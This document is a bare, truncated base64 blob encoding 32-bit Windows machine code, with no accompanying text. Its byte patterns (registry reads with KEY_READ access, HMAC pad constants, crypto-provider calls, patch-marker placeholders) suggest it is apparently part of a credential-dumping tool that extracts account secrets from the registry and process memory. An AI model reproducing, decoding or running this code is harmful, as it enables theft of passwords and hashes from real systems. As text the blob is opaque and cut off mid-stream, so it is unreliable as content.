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xfXlvJw1WL7IHs/AAAAFZXM/ZqPIv4jYVI////VlCJtUT////oQogAAGo8jYUI////VlCJtQT////oLYgAAIPEGIP/QHYDakBfV/91CI2FRP///1DoGIgAAFf/dQiNhQT///9Q6AiIAACDxBgzwIG0BUT///82NjY2gbQFBP///1xcXFyDwASD+EBy4o1FhFDoBHsAAGpAjYVE////UI1FhFDo7HoAAGoQ/3UMjUWEUOjeegAAjUWEUOjPegAAjXXcjX3spaWljUWEUKXoyHoAAGpAjYUE////UI1FhFDosHoAAGoQjUXsUI1FhFDooXoAAI1FhFDoknoAAIt9EI113KWlpaVfXsnDVYvsgexsAQAAjUWsiUXAiUW4uBAMAhBTM9uJhUj///+JhVj///+44AsCEFa+KAwCEImFaP///4mFeP///42F2P7//1eJXdyJXaiJXeCJXeiJXdSJXdiJXeyJXfSJXayJXbCJXbyJXbSJXfiJtdj+///Hhdz+//94JQIQx4Xg/v//QUFBQYmd5P7//4m16P7//8eF7P7//4QlAhDHhfD+//9CQkJCiZ30/v//ibX4/v//x4X8/v//lCUCEMeFAP///0NDQ0OJnQT///+JtQj////HhQz///+0JQIQx4UQ////RERERImdFP///4m1GP///8eFHP///8QlAhDHhSD///9FRUVFiZ0k////ibUo////x4Us////1CUCEMeFMP///0ZGRkaJnTT///+JtTj////HhTz////wJQIQx4VA////R0dHR4mdRP///8eFTP///xAmAhDHhVD///9ISEhIiZ1U////x4Vc////NCYCEMeFYP///0lJSUmJnWT////HhWz///9YJgIQx4Vw////SkpKSomddP///8eFfP///2gmAhDHRYBLS0tLiV2Ex0WI/AsCEMdFjHQmAhDHRZBMTExMiV2Ux0WYDAAAAIlFnDkdhNsCEA+FeAEAAFNTaHwmAhD/dQz/dQjotZX//4PEFIXAD4TpAAAA/zW43AIQuRjSAhBqBOhudf//i/hZWTv7D4SuAwAAi0cIiUW8i0cQiUW0jUX0aDgEAABQ6JwDAABZWYXAD4RvAwAAVv919I2FrP7//+ire///WVmFwHR6/3UMi4Ws/v///3UIiYXI/v//i4Ww/v//iYXM/v//i4W0/v//iYXQ/v//aMStABD/dxSNRbT/dwzHBYTbAhABAAAAUP93BI1FvFCNhcj+///oinP//4PEIIXAdRP/FfCRARBQaIgmAhDoanL//1lZiR2E2wIQ6eACAAD/FfCRARBQaPAmAhDoTHL//1lZ6cgCAAA5HYTbAhB1alNTaKQnAhD/dQz/dQjop5T//4PEFIXAdFGNRfRoOgQAAFDovAIAAFlZhcB0PY1FmFC47rcAELmYvAAQK8hRUItF9I2NwP7//+h2jv//g8QMhcB0C42FwP7//4lF+OsLaLgnAhDo1HH//1lqBlkzwI29lP7///OrjUXEUGoBjYWU/v//UFPoz3YAAIXAD4wiAgAAjUXkUGoF/3XE6LN2AACFwA+MBAIAAFNoPwAPAI1FzFBT6CV3AAA7w4lF8A+M1AEAAI1F/FCLReT/